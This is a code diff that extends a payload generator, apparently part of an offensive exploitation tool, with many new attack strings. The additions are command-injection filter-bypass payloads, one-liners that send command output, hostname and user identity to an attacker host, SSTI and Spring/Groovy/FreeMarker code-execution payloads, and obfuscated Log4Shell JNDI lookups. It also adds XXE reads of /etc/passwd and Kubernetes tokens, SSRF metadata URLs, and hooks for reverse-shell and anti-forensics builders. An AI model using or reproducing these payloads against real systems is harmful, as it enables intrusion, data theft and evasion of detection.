@@ -1,4 +1,7 @@
-import { buildReverseShells, buildCloudMetaPayloads, buildContainerEscapes } from "./bypassEngine.js";
+import { buildReverseShells, buildCloudMetaPayloads, buildContainerEscapes,
+         buildTimingPayloads, buildWindowsTimingPayloads, buildStealthPayloads,
+         buildWindowsPayloads, buildWindowsReverseShells, buildAntiForensicsPayloads,
+         buildLowNoiseOobPayloads } from "./bypassEngine.js";
 
 const TAB = "\t";
 const IFS = "${IFS}";
@@ -42,6 +45,10 @@ export function generateSuggestions(
         `${b};{sleep,7}`,
         `${b}%0asleep%207`,
         `${b}\nsleep 7`,
+        `${b}; java -cp . java.lang.Thread.sleep 7000 2>/dev/null`,
+        `${b}; /usr/bin/sleep 7`,
+        `${b}; python -c "import time;time.sleep(7)" 2>/dev/null`,
+        `${b}; usleep 7000000`,
       ];
 
     case "oob":
@@ -60,12 +67,16 @@ export function generateSuggestions(
         `${b} | socat - TCP:${attackerIp}:${attackerPort} 2>/dev/null`,
         `${b} && curl -sk --data-binary @- "http://${attackerIp}:${attackerPort}/" <<< "$(${b} 2>&1)"`,
         `_o=$(${b} 2>&1);curl -sk "http://${attackerIp}:${attackerPort}/?h=$(hostname)&u=$(whoami)&d=$(echo $_o|base64 -w0)"`,
+        `exec 3>/dev/tcp/${attackerIp}/${attackerPort};printf 'GET /?d='$(${b} 2>&1|base64 -w0)' HTTP/1.0\r\nHost: ${attackerIp}\r\n\r\n'>&3 2>/dev/null`,
+        `${b} && python3 -c "import socket,base64,os;d=base64.b64encode(os.popen('${b.replace(/'/g,"\\'")}').read().encode()).decode();s=socket.socket();s.connect(('${attackerIp}',${attackerPort}));s.send(('GET /?d='+d+' HTTP/1.0\r\nHost: ${attackerIp}\r\n\r\n').encode());s.close()"`,
+        `${b} 2>&1 | perl -MLWP::UserAgent -ne 'END{my $ua=LWP::UserAgent->new;$ua->get("http://${attackerIp}:${attackerPort}/?d=".join("",@d))}push@d,$_' 2>/dev/null`,
       ];
 
     case "quantum": {
       const b64full = b64(`${b} && uname -a && id`);
       const b64env  = b64(`${b} && env`);
       const b64x2   = b64(b64s);
+      const b64x3   = b64(b64x2);
       return [
         `{echo,${b64s}}|{base64,-d}|bash`,
         `bash<<<$(echo${TAB}${b64s}|base64${TAB}-d)`,
@@ -83,6 +94,10 @@ export function generateSuggestions(
         `echo ${rhex}|xxd -r -p|bash`,
         `bash <(echo ${b64s}|base64 -d)`,
         `source <(echo ${b64s}|base64 -d)`,
+        `{ _a="${b64x3}";bash<<<$(echo "$_a"|base64 -d|base64 -d|base64 -d); }`,
+        `echo ${rhex}|perl -pe 's/([0-9a-f]{2})/chr(hex($1))/gie'|bash`,
+        `python3 -c "import os;os.system(bytes.fromhex('${rhex}').decode())"`,
+        `node -e "require('child_process').execSync(Buffer.from('${rhex}','hex').toString(),{stdio:'inherit'})"`,
       ];
     }
 
@@ -101,6 +116,9 @@ export function generateSuggestions(
         `${b.replace(/ /g, "$'\\x20'")}`,
         `${b.replace(/ /g, "$'\\t'")}`,
         `bash${IFS}<<<$(echo${IFS}${b64s}|base64${IFS}-d)`,
+        `{ IFS=:; set -- ${b.replace(/ /g, ":")}; "$@"; }`,
+        `${b.replace(/ /g, "${IFS:1:1}")}`,
+        `{ X=${JSON.stringify(b)};IFS=' ';eval $X; }`,
       ];
 
     case "concat":
@@ -117,6 +135,8 @@ export function generateSuggestions(
         `_a=${JSON.stringify(b.slice(0,2))};_b=${JSON.stringify(b.slice(2))};_c="$_a$_b";$_c`,
         `${b.replace(/([a-z]{2})([a-z])/g,(_,a,c)=>a+'""'+c)}`,
         `${b.replace(/([a-z])([a-z]{2})/g,(_,a,bc)=>a+"''"+bc)}`,
+        `${b.split(" ").map(w=>w.split("").map((c,i)=>i===0?`"${c}"`:c).join("")).join(" ")}`,
+        `${b.replace(/([a-z])([a-z]{3,})/g,(_,a,rest)=>a+"${}"+rest)} 2>/dev/null||${b}`,
       ];
 
     case "hex":
@@ -133,16 +153,20 @@ export function generateSuggestions(
         `printf '${hex}'|bash`,
         `printf '%b' '${hex}'|bash`,
         `echo ${rhex}|perl -pe 's/([0-9a-f]{2})/chr(hex($1))/gie'|bash`,
+        `python3 -c "import codecs,os;os.system(codecs.decode('${rhex}','hex').decode())"`,
+        `{ _h="${rhex}";python3 -c "import os;os.system(bytes.fromhex('$_h').decode())"; }`,
       ];
 
     case "b64loop": {
       const b64x2 = b64(b64s);
       const b64x3 = b64(b64x2);
+      const b64x4 = b64(b64x3);
       return [
         `bash<<<$(echo${TAB}${b64s}|base64${TAB}-d)`,
         `{echo,${b64s}}|{base64,-d}|{bash,}`,
         `{ _a="${b64x2}"; _b=$(echo "$_a"|base64 -d|base64 -d); bash<<<$_b; }`,
         `{ bash<<<$(echo "${b64x3}"|base64 -d|base64 -d|base64 -d); }`,
+        `{ bash<<<$(echo "${b64x4}"|base64 -d|base64 -d|base64 -d|base64 -d); }`,
         `perl -MMIME::Base64 -e "system(decode_base64('${b64s}'))"`,
         `python3 -c "import base64,os;os.system(base64.b64decode('${b64s}').decode())"`,
         `ruby -e "require 'base64';system(Base64.decode64('${b64s}'))"`,
@@ -151,6 +175,7 @@ export function generateSuggestions(
         `$(which bash)<<<$(echo ${b64s}|base64 -d)`,
         `echo ${b64s}|openssl enc -d -base64|bash`,
         `bash -c "$(echo ${b64x2}|base64 -d|base64 -d)"`,
+        `python3 -c "import base64 as b,os;os.system(b.b64decode(b.b64decode('${b64x2}')).decode())"`,
       ];
     }
 
@@ -167,6 +192,9 @@ export function generateSuggestions(
         `BASH_ENV=/dev/stdin bash <<<${JSON.stringify(b)}`,
         `typeset _NX=${JSON.stringify(b)}; eval "$_NX"`,
         `local _NX=${JSON.stringify(b)} 2>/dev/null; eval "$_NX"`,
+        `{ mapfile -t _A <<<${JSON.stringify(b)}; ${JSON.stringify(b.split(" ")[0]??b)} "${JSON.stringify(b.split(" ").slice(1).join(" "))}"; } 2>/dev/null`,
+        `_X=${JSON.stringify(b)};$BASH -c "$_X"`,
+        `_X=${JSON.stringify(b)};$SHELL -c "$_X"`,
       ];
 
     case "heredoc": {
@@ -180,6 +208,8 @@ export function generateSuggestions(
         `ruby <<'RBEOF'\nsystem(${JSON.stringify(b)})\nRBEOF`,
         `node <<'JSEOF'\nrequire('child_process').execSync(${JSON.stringify(b)},{stdio:'inherit'});\nJSEOF`,
         `bash -c $(cat <<'EOF'\n${b}\nEOF\n)`,
+        `zsh <<'ZEOF'\n${b}\nZEOF`,
+        `php -r 'system(${JSON.stringify(b)});' <<'PHPEOF'\nPHPEOF`,
       ];
     }
 
@@ -196,6 +226,8 @@ export function generateSuggestions(
         `${b.split("").map(c=>`$(printf '\\x${c.charCodeAt(0).toString(16).padStart(2,"0")}')`).join("")}`,
         `python3 -c "import os;os.system(bytes([${[...Buffer.from(b)].map(x=>(x as number).toString()).join(",")}]).decode())"`,
         `node -e "require('child_process').execSync(String.fromCharCode(${[...Buffer.from(b)].map(x=>(x as number).toString()).join(",")}),{stdio:'inherit'})"`,
+        `printf '%s' $'${[...Buffer.from(b)].map(x=>`\\x${(x as number).toString(16).padStart(2,"0")}`).join("")}'|bash`,
+        `eval $'${[...Buffer.from(b)].map(x=>`\\x${(x as number).toString(16).padStart(2,"0")}`).join("")}'`,
       ];
     }
 
@@ -208,6 +240,9 @@ export function generateSuggestions(
         `${b}\x00`,
         `bash -c "${b.replace(/"/g,'\\"')}$'\\x00'"`,
         `python3 -c "import os;os.system(${JSON.stringify(b)}+chr(0))"`,
+        `${b}%00.jpg`,
+        `${b}\0`,
+        `${b}\u0000`,
       ];
 
     case "wildcard":
@@ -222,6 +257,9 @@ export function generateSuggestions(
         `$(ls /bin/b* 2>/dev/null|head -1) -c "${b}"`,
         `{b,}a{s,}h -c "${b}"`,
         `/usr/b??/env bash -c "${b}"`,
+        `/???/b??h -c "$(printf '${hex}')"`,
+        `/???/b??h<<<$(printf '${hex}')`,
+        `ls /usr/bin/p* 2>/dev/null|grep -m1 ython|xargs -I{} {} -c "import os;os.system(${JSON.stringify(b)})"`,
       ];
 
     case "comment":
@@ -233,6 +271,9 @@ export function generateSuggestions(
         `{ ${b.split(" ").join("; : #;\n")}; }`,
         `${b.replace(/ /g, " -- ")}`,
         `${b.replace(/ /g, " # comment\\\n")}`,
+        `${b.split(" ").join("\t#c\\\n")}`,
+        `${b}${" "}# this is a comment`,
+        `${b};#`,
       ];
 
     case "double_enc":
@@ -244,6 +285,8 @@ export function generateSuggestions(
         `eval "$(echo '${b64(b64s)}'|base64 -d|base64 -d)"`,
         `$(printf '%b' '${hex}')`,
         `bash -c "$(printf '%b' '${hexEsc(hex)}')"`,
+        `{ _x=$(printf '%b' '${hex}');eval "$_x"; }`,
+        `python3 -c "import codecs,os;os.system(codecs.decode(codecs.decode('${b64(b64s)}','base64').decode(),'base64').decode())"`,
       ];
 
     case "brace":
@@ -255,6 +298,8 @@ export function generateSuggestions(
         `{b,}a{s,}h<<<$(echo${IFS}${b64s}|{base64,-d})`,
         `{b,}a{s,}h -c "$(printf '${hex}')"`,
         `[[ 1 -eq 1 ]] && {b,}a{s,}h -c ${JSON.stringify(b)}`,
+        `{echo,${b64(b64s)}}|{base64,-d}|{base64,-d}|{bash,}`,
+        `{p,}y{t,}ho{n,}3 -c "import os;os.system(${JSON.stringify(b)})"`,
       ];
 
     case "process_sub":
@@ -266,6 +311,9 @@ export function generateSuggestions(
         `bash <(printf '%b' '${hex}')`,
         `eval <(echo ${b64s}|base64 -d)`,
         `bash <(python3 -c "import base64;print(base64.b64decode('${b64s}').decode())")`,
+        `. <(printf '${hex}')`,
+        `source <(printf '%b' '${hex}')`,
+        `bash <(perl -MMIME::Base64 -e "print decode_base64('${b64s}')")`,
       ];
 
     case "arith": {
@@ -277,6 +325,8 @@ export function generateSuggestions(
         `node -e "require('child_process').execSync(String.fromCharCode(${codes}),{stdio:'inherit'})"`,
         `perl -e "system(chr(${codes.replace(/,/g,").chr(")}))"`,
         `ruby -e "system([${codes}].pack('C*'))"`,
+        `php -r "system(implode(array_map('chr',array(${codes}))));"`,
+        `python3 -c "exec(bytes([${codes}]).decode())"`,
       ];
     }
 
@@ -294,6 +344,8 @@ export function generateSuggestions(
         `bash -c $'${hexEsc(b)}'`,
         `eval $'${[...Buffer.from(b)].map(x=>`\\${(x as number).toString(8).padStart(3,"0")}`).join("")}'`,
         `{ _c=$'${hexEsc(b)}';eval "$_c"; }`,
+        `sh -c $'${ansi}'`,
+        `$0 -c $'${ansi}'`,
       ];
     }
 
@@ -307,8 +359,27 @@ export function generateSuggestions(
         `perl -e "system(scalar reverse ${JSON.stringify(rev)})"`,
         `node -e "require('child_process').execSync(${JSON.stringify(rev)}.split('').reverse().join(''),{stdio:'inherit'})"`,
         `ruby -e "system(${JSON.stringify(rev)}.reverse)"`,
+        `{ _r=${JSON.stringify(rev)};_f=$(echo "$_r"|rev);bash -c "$_f"; }`,
       ];
     }
+
+    case "timing":
+      return buildTimingPayloads(7);
+
+    case "windows_timing":
+      return buildWindowsTimingPayloads(7);
+
+    case "stealth":
+      return buildStealthPayloads(b);
+
+    case "windows":
+      return buildWindowsPayloads(b);
+
+    case "windows_rev":
+      return buildWindowsReverseShells(attackerIp, attackerPort);
+
+    case "antiforensics":
+      return buildAntiForensicsPayloads(b);
 
     case "ssti":
       return [
@@ -331,6 +402,9 @@ export function generateSuggestions(
         `{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}`,
         `{{'${b}'|filter('system')}}`,
         `{{constructor.constructor('return process.mainModule.require("child_process").execSync("${b}")')()}}`,
+        `{{range.constructor("return global.process.mainModule.require('child_process').execSync('${b}').toString()")()}}`,
+        `{{this.constructor.constructor('return process.mainModule.require("child_process").execSync("${b}").toString()')()}}`,
+        `{#with "s" as |string|}{#with "e"}{#with split as |conslist|}{#each conslist}{#with (string.sub.apply 0 conslist)}{#with (string.sub.apply 0 conslist)}{{lookup (lookup this "constructor") "constructor"}}{{#with (string.sub.apply 0 conslist)}}{{#with (string.sub.apply 0 conslist)}}{{#with (string.sub.apply 0 conslist)}}{{#with (string.sub.apply 0 conslist)}}{{#with (string.sub.apply 0 conslist)}}{{#with (string.sub.apply 0 conslist)}}{{#with (string.sub.apply 0 conslist)}}{{#with (string.sub.apply 0 conslist)}}{{#with (string.sub.apply 0 conslist)}}{{log this}}{{/with}}`,
       ];
 
     case "log4shell": {
@@ -354,6 +428,16 @@ export function generateSuggestions(
         `\${jndi:ldap://\${env:NaN:-${lh}}:${lp}/exploit}`,
         `\${jndi:ldap://${lh}:${lp}/\${java:os}}`,
         `\${jndi:\${lower:l}\${lower:d}\${lower:a}\${lower:p}://${lh}:${lp}/exploit}`,
+        `\${jndi:ldap://${lh}:${lp}/\${sys:user.name}}`,
+        `\${jndi:ldap://${lh}:${lp}/\${sys:user.home}}`,
+        `\${jndi:ldap://${lh}:${lp}/\${env:PATH}}`,
+        `\${jndi:ldap://${lh}:${lp}/\${java:vm}}`,
+        `\${jndi:ldap://${lh}:${lp}/\${ctx:loginId}}`,
+        `\${jndi:ldaps://${lh}:${lp}/exploit}`,
+        `\${jndi:iiop://${lh}:${lp}/exploit}`,
+        `\${j${"{"}::-n${"}"}di:ldap://${lh}:${lp}/a}`,
+        `\${${"{"}lower:j${"}"}ndi:ldap://${lh}:${lp}/a}`,
+        `\${::-\${::-j}\${::-n}\${::-d}\${::-i}:\${::-l}\${::-d}\${::-a}\${::-p}://${lh}:${lp}/a}`,
       ];
     }
 
@@ -371,6 +455,11 @@ export function generateSuggestions(
         `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "dict://127.0.0.1:11211/stat">]><r>&x;</r>`,
         `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "ftp://${xh}:${xp}/x">]><r>&x;</r>`,
         `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "file:///c:/windows/win.ini">]><r>&x;</r>`,
+        `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY % p1 "<!ENTITY exfil SYSTEM 'http://${xh}:${xp}/?x=%25c;'>"><!ENTITY % c SYSTEM "file:///etc/passwd">%p1;]><r>&exfil;</r>`,
+        `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "file:///var/run/secrets/kubernetes.io/serviceaccount/token">]><r>&x;</r>`,
+        `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "file:///proc/self/maps">]><r>&x;</r>`,
+        `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "netdoc:///etc/passwd">]><r>&x;</r>`,
+        `<?xml version="1.0"?><!DOCTYPE r SYSTEM "http://${xh}:${xp}/r.dtd"><r>&exfil;</r>`,
       ];
     }
 
@@ -391,6 +480,13 @@ export function generateSuggestions(
         `'+(${b})+'`,
         `\`;${b};//`,
         `${b}\r\n${b}`,
+        `<script>${b}</script>`,
+        `\${${b}}`,
+        `#{${b}}`,
+        `<%=${b}%>`,
+        `[[${b}]]`,
+        `{#${b}#}`,
+        `@(${b})`,
       ];
 
     case "rev_shell":
@@ -424,6 +520,30 @@ export function generateSuggestions(
         `http://127.0.0.1/?${b}`,
         `gopher://127.0.0.1:6379/_SLAVEOF%20127.0.0.1%206380%0d%0a`,
         `http://127.0.0.1:8500/v1/kv/?recurse`,
+        "http://169.254.169.254/latest/meta-data/",
+        "http://100.100.100.200/latest/meta-data/",
+        "http://192.168.0.1/",
+        "http://10.0.0.1/",
+        "http://2130706433/",
+        "http://0/",
+        "http://localhost/",
+        "http://127.1/",
+        "http://127.0.1/",
+        "http://0:80/",
+        "http://[0:0:0:0:0:ffff:127.0.0.1]/",
+        "http://169.254.169.254.nip.io/latest/meta-data/",
+        "http://127.0.0.1.nip.io/",
+        "http://localtest.me/",
+        "http://127.0.0.1:80/",
+        "http://127.0.0.1:443/",
+        "http://127.0.0.1:22/",
+        "http://127.0.0.1:3306/",
+        "http://127.0.0.1:5432/",
+        "http://127.0.0.1:6379/",
+        "http://127.0.0.1:9200/",
+        "http://127.0.0.1:8080/",
+        "http://127.0.0.1:4848/",
+        "http://fd00:ec2::254/latest/meta-data/",
       ];
 
     case "spring":
@@ -440,6 +560,9 @@ export function generateSuggestions(
         `${"${"}T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/bash","-c","id"})${"}"}`,
         `${"#{"}T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/sh","-c","${b.replace(/"/g,'\\"')}"})${"}"}`,
         `${"${"}T(java.lang.Runtime).getRuntime().exec('whoami')${"}"}`,
+        `${"${"}T(java.lang.Runtime).getRuntime().exec(new String[]{"sh","-c","${b.replace(/"/g,'\\"')}"}).getInputStream()${"}"}`,
+        `${"${"}T(java.net.InetAddress).getByName('${attackerIp}').toString()${"}"}`,
+        `${"${"}T(java.lang.Runtime).getRuntime().exec(T(java.util.Arrays).asList("sh","-c","${b.replace(/"/g,'\\"')}").toArray(new String[0]))${"}"}`,
       ];
 
     case "freemarker":
@@ -454,6 +577,7 @@ export function generateSuggestions(
         `<#assign s="freemarker.template.utility.Execute"?new()><#list s("${b.replace(/"/g,'\\"')}")?split("\\n") as l>\${l}</#list>`,
         `<#assign ex="freemarker.template.utility.Execute"?new()>\${ex("id")}`,
         `<#assign ex="freemarker.template.utility.Execute"?new()>\${ex("whoami")}`,
+        `<#assign classloader=object?api.class.protectionDomain.classLoader><#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")><#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)><#assign ec=dwf.getClass().forName("freemarker.template.utility.Execute")>\${dwf.newInstance(ec,null)("${b.replace(/"/g,'\\"')}")}`,
       ];
 
     case "groovy":
@@ -470,6 +594,8 @@ export function generateSuggestions(
         `def b=new String(Base64.decoder.decode('${b64s}'));b.execute().text`,
         `this.class.classLoader.loadClass("java.lang.Runtime").getRuntime().exec("${b.replace(/"/g,'\\"')}").text`,
         `groovy.util.Eval.me("'${b.replace(/'/g,"\\'")}' as GString")`,
+        `@Grab('commons-io:commons-io:2.4') import org.apache.commons.io.IOUtils;IOUtils.toString("${b.replace(/"/g,'\\"')}".execute().getInputStream(),"UTF-8")`,
+        `Thread.currentThread().contextClassLoader.loadClass("java.lang.Runtime").getRuntime().exec("${b.replace(/"/g,'\\"')}").text`,
       ];
 
     case "php_wrapper":
@@ -486,6 +612,11 @@ export function generateSuggestions(
         `php://filter/read=convert.base64-encode/resource=php://filter/read=convert.base64-encode/resource=/etc/passwd`,
         `data://text/plain;base64,${b64(`<?php system($_GET['c']); ?>`)}`,
         `php://filter/zlib.deflate|convert.base64-encode/resource=/etc/passwd`,
+        `glob:///etc/p*`,
+        `php://filter/string.strip_tags/resource=/etc/passwd`,
+        `php://filter/read=string.toupper/resource=/etc/passwd`,
+        `compress.zlib:///etc/passwd`,
+        `compress.bzip2:///etc/passwd`,
       ];
 
     default:
